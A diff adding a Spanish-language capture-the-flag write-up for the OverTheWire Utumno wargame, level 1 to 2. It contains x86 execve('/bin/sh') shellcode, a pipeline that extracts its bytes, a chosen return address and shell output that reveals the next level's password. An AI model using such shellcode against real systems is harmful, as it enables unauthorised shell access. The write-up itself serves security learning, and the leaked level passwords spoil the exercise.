@@ -26,3 +26,38 @@ utumno2
 $ cat /etc/utumno_pass/utumno2
 ceewaceiph
 LA CONTRASEÑA HALLADA FUE ; ceewaceiph
+
+LEVEL 1->2
+Ingresamo con ssh utumno2@utumno.labs.overthewire.org -p 2227
+Contraseña: ceewaceiph
+al entrar nos da numeros binarios, usamos execve() para que ejecute el programa , creamos una matris con 11 valores de acuerdo a los numeros que nos dio, escirbimos una shellcode  que nos da 
+global _start
+section .text
+_start:
+xor eax, eax
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+push eax
+mov edx, esp
+push ebx
+mov ecx, esp
+mov al, 0xb
+int 0x80
+extraemos y nos da 
+utumno2@utumno:/tmp/ax$ nasm -f elf32 shell.a
+utumno2@utumno:/tmp/ax$ ld -m elf_i386 -s -o shell shell.o
+
+objdump -d ./shell.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+modificamos al codigo qu teniamos antes y buscamos una dirreccion de devolucion valida, seleccionamos 0xffffdfb0 y compilamos ,, nos devolvio 
+utumno2@utumno:/tmp/ax$ gcc -m32 -static code.c -o code
+utumno2@utumno:/tmp/ax$ ./code
+$ whoami
+utumno3
+$ cat /etc/utumno_pass/utumno3
+zuudafiine
+$
+LA CONTRASEÑÑA HALLADA FUE : zuudafiine
+
